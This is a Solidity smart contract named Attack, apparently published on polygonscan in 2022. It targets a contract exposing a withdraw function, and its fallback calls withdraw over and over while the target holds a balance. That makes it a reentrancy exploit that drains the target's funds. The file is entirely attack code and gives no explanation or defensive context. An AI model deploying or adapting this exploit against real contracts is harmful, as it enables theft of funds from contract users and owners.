/**
 *Submitted for verification at polygonscan.com on 2022-09-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBlockPurse {

    function withdraw(uint256 amount) external returns (bool);

}

contract Attack {

    address public target;

    fallback() external {
        for(uint256 i=0; i <= 10; i++) {
            if (target.balance >= 1) {
                IBlockPurse(target).withdraw(1);
            } else {
                return;
            }
        }
    }

    constructor(address _target) {
        target = _target;
    }


    function doAttack(uint256 amount) external returns (bool) {
        IBlockPurse(target).withdraw(amount);
        return true;
    }

}